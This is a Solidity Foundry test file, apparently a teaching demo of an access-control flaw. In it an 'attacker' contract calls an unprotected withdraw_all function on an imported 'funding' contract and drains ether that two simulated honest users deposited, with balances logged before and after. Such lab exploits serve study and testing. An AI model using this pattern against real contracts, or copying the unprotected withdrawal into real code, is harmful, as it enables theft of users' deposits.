//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./funding.sol";

contract attacker {
    funding public target;

    constructor(address _target) {
        target = funding(payable(_target));
    }

    function attack() public {
        target.withdraw_all();
    }

    receive() external payable {}
}

contract test_ac is Test {
    funding public target;
    attacker public hacker;
    address honest_user1 = address(1);
    address honest_user2 = address(2);

    function setUp() external {
        target = new funding();
        hacker = new attacker(address(target));
        vm.deal(honest_user1, 100 ether);
        vm.deal(honest_user2, 200 ether);
    }

    function test_ac_textbook() external {
        console.log("Amount of eth in the contract at the start: ", target.check_total(), "\n");
        console.log(" ");

        console.log("Honest user 1 deposits 100 ether");
        vm.prank(honest_user1);
        target.deposit{value: 100 ether}();
        console.log("Amount of eth in the contract: ", target.check_total());
        console.log(" ");

        console.log("Honest user 2 deposits 200 ether");
        vm.prank(honest_user2);
        target.deposit{value: 200 ether}();
        console.log("Amount of eth in the contract: ", target.check_total());
        console.log(" ");

        console.log("Honest user 1 withdraws his deposited balance");
        vm.prank(honest_user1);
        target.withdraw();
        console.log("Amount of eth in the contract: ", target.check_total());
        console.log(" ");

        console.log("Attacker starts attacking the contract");
        console.log(" ");
        console.log("Attackers balance before attack: ", address(hacker).balance, "Ether");
        hacker.attack();
        console.log("Attackers balance after attack: ", address(hacker).balance / 1e18, "Ether");
        console.log(" ");
        console.log("Amount of eth in the contract: ", target.check_total());
    }
}

